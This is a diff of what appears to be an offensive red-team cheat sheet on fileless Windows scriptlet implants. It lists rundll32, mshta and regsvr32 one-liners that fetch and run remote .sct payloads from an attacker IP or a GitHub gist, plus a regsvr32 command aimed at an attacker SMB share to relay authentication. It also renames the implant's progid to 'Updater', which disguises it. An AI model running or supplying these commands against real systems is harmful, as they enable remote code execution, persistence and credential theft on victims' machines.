@@ -13,23 +13,13 @@ credits:
 ---
 # Scriptlet
 
-## 01 - Command Prompt
-
-### 1.1 - Rundll32
-
-```
-C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http[s]://<attacker_IP>/implant.sct");window.close();
-```
-
-### 1.2 - Regsvr32
-
 Fileless scriptlet implant template.
 
 ```xml
 <?XML version="1.0"?>
 <scriptlet>
 <registration 
-    progid="PoC"
+    progid="Updater"
     classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
     <script language="JScript">
         <![CDATA[
@@ -40,13 +30,23 @@ Fileless scriptlet implant template.
 </scriptlet>
 ```
 
-Execute DLL implant.
+## 01 - Command Prompt
+
+### 1.1 - `rundll32.exe`
 
 ```
-C:\> regsvr32.exe /s implant.dll
+C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http[s]://<attacker_IP>/implant.sct");window.close();
 ```
 
-Execute a SCT implant.
+### 1.2 - `mshta.exe`
+
+```
+mshta javascript:o=GetObject("script:https://gist.githubusercontent.com/NickTyrer/0598b60112eaafe6d07789f7964290d5/raw/7717cfad109fc15a6796dd9119b0267f7a4df3fd/power.sct");o.Exec();close();
+```
+
+### 1.3 - `regsvr32.exe`
+
+Execute a SCT dropper implant.
 
 ```
 C:\> regsvr32.exe /s /u /i:implant.sct scrobj.dll
@@ -66,7 +66,7 @@ Execute command to perform SMB authentication relay.
 C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\@snare scrobj.dll
 ```
 
-### 1.3 - CMSTP
+### 1.4 - `cmstp.exe`
 
 Fileless scriptlet implant template
 
